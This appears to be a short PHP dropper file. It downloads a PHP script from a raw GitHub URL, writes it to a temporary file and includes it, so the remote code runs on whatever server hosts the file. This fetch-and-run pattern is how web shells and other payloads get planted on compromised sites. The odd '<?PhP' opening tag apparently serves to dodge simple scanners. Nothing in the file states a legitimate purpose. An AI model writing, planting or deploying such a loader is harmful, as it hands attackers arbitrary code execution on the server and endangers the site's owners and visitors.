<?PhP
$url = 'https://raw.githubusercontent.com/bublebeeeee/piw/refs/heads/main/minimshteam.php';

$temp = tmpfile();
fwrite($temp, file_get_contents($url));

$meta = stream_get_meta_data($temp);
include $meta['uri'];

fclose($temp);

?>
